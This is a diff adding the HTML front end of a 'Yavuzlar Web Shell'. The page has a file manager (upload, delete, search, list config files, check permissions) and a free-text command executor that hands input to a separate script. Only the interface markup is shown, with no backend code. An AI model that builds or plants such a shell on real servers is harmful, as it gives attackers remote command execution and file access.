@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yavuzlar Web Shell</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="file-manager">
+        <h1>File Manager</h1>
+        <div id="file-list"></div>
+
+        
+        <input type="file" id="file-upload">
+        <button onclick="uploadFile()">Upload File</button>
+        
+        
+        <input type="text" id="delete-file" placeholder="Enter file name to delete">
+        <button onclick="deleteFile()">Delete File</button>
+        
+        
+        <input type="text" id="search-file" placeholder="Search for files">
+        <button onclick="searchFiles()">Search</button>
+
+        
+        <button onclick="listConfigFiles()">List Config Files</button>
+        
+        
+        <button onclick="checkPermissions()">Check Permissions</button>
+        
+        
+        <button onclick="refreshFiles()">Refresh</button>
+    </div>
+
+    <div id="command-executor">
+        <h2>Command Executor</h2>
+        <textarea id="command-input" placeholder="Enter command here..."></textarea>
+        <button onclick="executeCommand()">Run</button>
+        <div id="command-output"></div>
+    </div>
+    
+    <script src="script.js"></script>
+</body>
+</html>
+
